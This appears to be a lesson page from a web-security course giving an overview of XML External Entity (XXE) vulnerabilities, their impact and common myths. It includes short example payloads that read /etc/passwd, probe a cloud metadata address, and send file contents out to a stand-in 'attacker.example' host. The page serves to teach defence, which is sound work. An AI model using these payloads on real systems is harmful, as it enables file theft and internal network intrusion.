# A4:2017 – XML External Entities (XXE): Overview

## Table of Contents

- [What is XXE?](#what-is-xxe)
- [How XML and Entities Actually Work](#how-xml-and-entities-actually-work)
- [Why It Matters](#why-it-matters)
- [Technical Context](#technical-context)
- [Real-World Impact](#real-world-impact)
- [Prevalence](#prevalence)
- [Common Misunderstandings](#common-misunderstandings)
- [A Note on the 2021 Edition](#a-note-on-the-2021-edition)
- [Self-Assessment](#self-assessment)

## What is XXE?

An **XML External Entity (XXE)** vulnerability occurs when an application parses XML input using a parser that is configured—usually by default—to resolve *external entities* and *document type definitions (DTDs)*, and an attacker can influence that XML. The XML standard allows a document to define entities that pull content from an external source: a local file, a URL, or another part of the document itself. A parser that honours those instructions on attacker-supplied XML becomes a confused deputy—it reads files, opens network connections, and expands data on the attacker's behalf, using the application's own privileges.

The critical insight is that XXE is almost never a bug in the application's own code. The application does exactly what XML parsing libraries were historically designed to do. The vulnerability lives in a **default configuration**: the parser was shipped with external entity resolution enabled, nobody turned it off, and untrusted XML reached it. That is why XXE is a configuration-and-defaults problem at heart, and why the same one-line hardening fix appears over and over across languages.

> **In one sentence:** XXE is what happens when a program trustingly follows an attacker's instructions to *go fetch this file or URL and paste it into the document*, because the XML parser was never told to stop doing that.

### The Classic Payload

The canonical example defines an external entity that points at a local file, then references it in the document body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

When a vulnerable parser processes this document, it resolves `&xxe;` by opening `/etc/passwd` and substituting its contents. If the application then echoes the parsed `<name>` value back to the user—in a response, an error message, or a rendered page—the attacker reads the file. The same technique redirected at an internal URL turns the server into a proxy for the attacker (SSRF); redirected at itself in a nested loop, it exhausts memory (denial of service).

## How XML and Entities Actually Work

To understand XXE you need to understand the feature it abuses. XML has four relevant concepts, and only the last two are dangerous.

### Document Type Definitions (DTDs)

A DTD declares the structure and the entities a document may use. It can be *internal* (inside the document, in the `<!DOCTYPE ... [ ... ]>` block) or *external* (referenced by URL). The internal DTD subset is where attackers plant their entity declarations, because it travels inside the attacker-controlled document itself.

### Internal (General) Entities

An ordinary entity is just a named text macro. It is harmless on its own:

```xml
<!DOCTYPE note [
  <!ENTITY company "Acme Corporation">
]>
<note>&company;</note>
```

Here `&company;` simply expands to the literal string. Note that `&lt;`, `&gt;`, `&amp;`, `&quot;`, and `&apos;` are the five predefined entities every XML document uses for escaping—those are not the problem.

### External Entities (the dangerous part)

An external entity uses the `SYSTEM` (or `PUBLIC`) keyword to pull its value from a URI. The parser dereferences that URI when it expands the entity:

```xml
<!ENTITY xxe SYSTEM "file:///etc/hostname">      <!-- reads a local file -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/">    <!-- makes an HTTP request -->
<!ENTITY xxe SYSTEM "php://filter/...">           <!-- abuses a URL wrapper -->
```

The supported URI schemes depend on the parser and the platform: `file://`, `http://`, and `ftp://` are near-universal; language-specific wrappers such as PHP's `php://`, `expect://`, and `data://`, or Java's `jar://` and `netdoc://`, dramatically expand what an attacker can reach.

### Parameter Entities

Parameter entities use a `%` sigil and are only valid inside a DTD. They are the workhorse of *blind* and *out-of-band* XXE, because they can be combined and referenced in places where ordinary entities are blocked, and they let an attacker build a request dynamically from a stolen file's contents:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?x=%file;'>">
%eval;
%exfil;
```

You do not need to memorise this yet—the Attack Vectors page breaks it down—but notice the shape: read a file into a parameter entity, then smuggle its contents into a URL that the parser will contact. That is how an attacker exfiltrates data even when the application never shows them the parsed result.

## Why It Matters

### Business Impact

- **Confidential data disclosure**: Source code, configuration files, private keys, connection strings, and `/etc/passwd`-style system files can be read directly off the server—often the first step toward full compromise.
- **Breach of internal systems**: By turning the server into an SSRF proxy, an attacker reaches databases, admin panels, and cloud metadata services that were never meant to face the internet.
- **Service outages**: Entity-expansion denial of service (the "billion laughs" attack) can take a service offline with a payload of a few hundred bytes, no authentication required.
- **Regulatory and contractual exposure**: Because XXE frequently exposes personal data and secrets, it triggers GDPR, HIPAA, and PCI-DSS breach-notification and penalty regimes.
- **Supply-chain reach**: XXE commonly hides in *file upload* features—document converters, image processors, invoice importers—so a single vulnerable dependency can expose every product that embeds it.

### Technical Impact

- **Arbitrary local file read**: Any file the application process can read is reachable.
- **Server-Side Request Forgery (SSRF)**: The server issues attacker-chosen requests to internal hosts and cloud metadata endpoints.
- **Denial of Service**: Exponential (billion laughs) or quadratic entity expansion, or a `file:///dev/random` read, exhausts CPU and memory.
- **Out-of-band data exfiltration (blind XXE)**: Even with no visible output, parameter entities can ship file contents to an attacker-controlled server.
- **Remote code execution (situational)**: On misconfigured PHP builds with the `expect://` wrapper, or via chained internal services, XXE can escalate to code execution—the high end of the impact range, not the common case.

## Technical Context

### Why Default Parser Behaviour Is the Root Cause

XML predates the modern threat model. When the specifications were written, resolving external entities was a feature, not a risk—documents were authored by trusted parties. Parsing libraries therefore shipped with DTD processing and external entity resolution **enabled by default**, and generations of developers inherited those defaults without realising a security decision had been made for them. XXE is the accumulated cost of that history: the fix is almost always to *disable* a feature, not to add validation.

Over time some libraries changed their defaults. Notably, the widely used `libxml2` library (which underpins PHP's XML functions, Python's `lxml`, and many others) stopped loading external entities by default in version 2.9.0, released in 2012—a change that quietly removed a large class of XXE from software that upgraded. But defaults still vary enormously across parsers, versions, and languages, which is why you must verify hardening per parser rather than assume you are safe.

### Where XXE Lives: File Formats That Are XML Underneath

A crucial reason XXE outlived the "nobody uses XML anymore" era is that many common formats are XML under the hood. An application that "only accepts image uploads" or "only imports spreadsheets" may still be feeding attacker XML straight into a parser:

| Format | What it really is | Typical entry point |
| --- | --- | --- |
| SVG | XML vector graphics | Avatar / image upload, thumbnail generation |
| DOCX / XLSX / PPTX (OOXML) | Zip of XML parts | Document import, preview, text extraction |
| SOAP | XML messaging envelope | Legacy web-service and B2B endpoints |
| SAML | XML assertions for SSO | Login / single sign-on flows |
| RSS / Atom / XML-RPC | XML feeds and RPC | Feed readers, pingbacks, blog APIs |
| SVG in PDF, GPX, KML, plist, DTD-driven config | XML dialects | Converters, mapping tools, config loaders |

The lesson: the question is never "do we accept XML?" but "does any input path—however disguised—reach an XML parser?"

### The Three Flavours of XXE

- **In-band (classic)**: The parsed entity value is reflected back in the response, so the attacker reads the file directly.
- **Blind / out-of-band**: Nothing is reflected, but the parser can be made to contact an attacker-controlled server, leaking data through the request it sends.
- **Error-based**: The attacker forces the file contents into a parser error message that the application returns, reading data through the exception text.

## Real-World Impact

The examples below are described as **incident classes**—patterns that have been repeatedly and publicly documented—rather than as specific CVEs with precise figures, to keep the teaching accurate.

### Class 1: XXE in Single Sign-On (SAML) Implementations

SAML assertions are XML, and they are parsed *before* the user is authenticated. Multiple SSO and identity libraries have historically been found to parse assertions with external entities enabled, allowing an unauthenticated attacker to read server files or trigger SSRF simply by submitting a crafted login. The lesson is that pre-authentication XML parsing is an especially high-value target.

### Class 2: XXE via Document and Image Upload (SVG / OOXML)

Applications that accept SVG avatars or Office documents and then parse, convert, or extract text from them have repeatedly been exploited: the uploaded file carries a malicious DTD, and the server-side processor resolves it. Bug-bounty programmes at large platforms have paid out many times for exactly this pattern, because "image upload" rarely looks like "XML parsing" to the developers who build it.

### Class 3: XXE in SOAP and Legacy Web Services

SOAP endpoints and XML-RPC interfaces—common in enterprise, banking, and telecom systems—consume XML by definition. Many were built on older parser defaults and remained in production for years, making them a durable source of file-disclosure and internal-SSRF findings in penetration tests.

### Class 4: Entity-Expansion Denial of Service ("Billion Laughs")

The billion laughs attack is a documented, decades-old class in which a tiny document defines nested entities that expand exponentially—ten levels of ten-fold expansion turns a few hundred bytes into gigabytes of text in memory. It requires no data disclosure and no authentication, only a parser that expands entities without limits.

### Class 5: SSRF to Cloud Metadata via XXE

On cloud infrastructure, an internal metadata endpoint (the link-local `169.254.169.254` address on several providers) can return temporary credentials to anything that can make an HTTP request from the instance. XXE that reaches that endpoint has been used to harvest cloud credentials and pivot to broader account compromise—an especially severe escalation of a "read-only" file bug.

## Prevalence

In the OWASP Top 10 2017, XXE debuted at position **A4**, added largely on the strength of automated and manual testing data plus source-code analysis rather than raw incident counts. It is best characterised, in OWASP's own qualitative terms, as follows:

- **Exploitability: high** for classic in-band XXE—the payload is short, well-known, and needs no special tooling.
- **Prevalence: common** wherever XML is parsed, precisely because insecure defaults were the norm for so long.
- **Detectability: easy to moderate**—in-band XXE is trivial to spot; blind and out-of-band variants require an external listener and more skill.
- **Impact: severe**—file disclosure, SSRF, and DoS from a single class, with occasional escalation to RCE.

> Note: Different reports give different frequency figures for XXE, and those numbers shift year to year and by application population. Treat any single percentage as illustrative. The durable, defensible takeaways are that XXE is common wherever XML parsing exists, cheap to exploit in its classic form, and high-impact when it lands.

## Common Misunderstandings

### Myth 1: "We don't use XML, so XXE can't affect us"

**Reality**: SVG, DOCX/XLSX, SOAP, SAML, RSS, and many config formats are XML. If any upload or import path reaches a parser, XXE is in scope even if you never wrote `<xml>` yourself.

### Myth 2: "XXE just leaks a file; it's not that serious"

**Reality**: The same primitive that reads `/etc/passwd` reads private keys and cloud credentials, performs SSRF into the internal network, and can take the service offline. On cloud instances it is frequently a stepping stone to account takeover.

### Myth 3: "Input validation / a WAF will stop it"

**Reality**: Attackers encode payloads (UTF-16, nested entities, external DTDs) to slip past signatures, and blind XXE produces no obvious markers. A WAF is a useful supplementary layer, but the only reliable fix is disabling DTDs and external entities in the parser itself.

### Myth 4: "Disabling the DOCTYPE for one parser secures the whole app"

**Reality**: Applications often use several XML parsers (one per library and code path). Each must be hardened independently, because a single unhardened parser reopens the hole.

### Myth 5: "It needs authentication, so the risk is low"

**Reality**: SAML and SOAP frequently parse XML *before* a user is authenticated, and many upload features are reachable by any registered user. Pre-auth or low-privilege XXE is common.

### Myth 6: "The parser is patched, so we're fine"

**Reality**: Patching helps, and some libraries changed their defaults, but many parsers still resolve entities when asked unless you explicitly disable the feature. Patching and secure configuration are complementary, not interchangeable.

## A Note on the 2021 Edition

In the **OWASP Top 10 2021**, XXE no longer appears as its own category. It was **merged into A05:2021 – Security Misconfiguration**, on the reasoning that XXE is fundamentally an insecure-default / configuration problem and belongs with the broader misconfiguration family. This lesson deliberately keeps the **2017 A4 framing** because it treats XXE in depth as a distinct, teachable class—but be aware that in a 2021-aligned assessment you will find XXE catalogued under Security Misconfiguration. The vulnerability, the payloads, and the fixes are identical; only the label moved.

## Self-Assessment

You understand this overview if you can answer the following without looking back:

- What is the difference between an internal general entity and an external entity, and why is only the latter dangerous?
- Why is XXE described as a configuration/defaults problem rather than an application-logic bug?
- Name three non-obvious file formats that are XML underneath and could carry an XXE payload.
- Explain the difference between in-band, blind/out-of-band, and error-based XXE.
- How can a "read-only" file-disclosure XXE escalate to cloud account compromise?
- What is the billion laughs attack, and why does it need no authentication or data disclosure?
- Where did XXE go in the 2021 Top 10, and why?

## Next Steps

- **[Attack Vectors](attack-vectors.html)**: The core flow plus a catalogue of concrete XXE techniques with payloads.
- **[Prevention](prevention.html)**: Layered defences and per-parser hardening you can apply today.
- **[Examples](examples.html)**: Vulnerable-vs-secure parser configuration in Java, Python, PHP, and .NET.
- **[Hands-On Lab](./lab/xml-external-entities/)**: Practice discovering and fixing XXE in a running application.
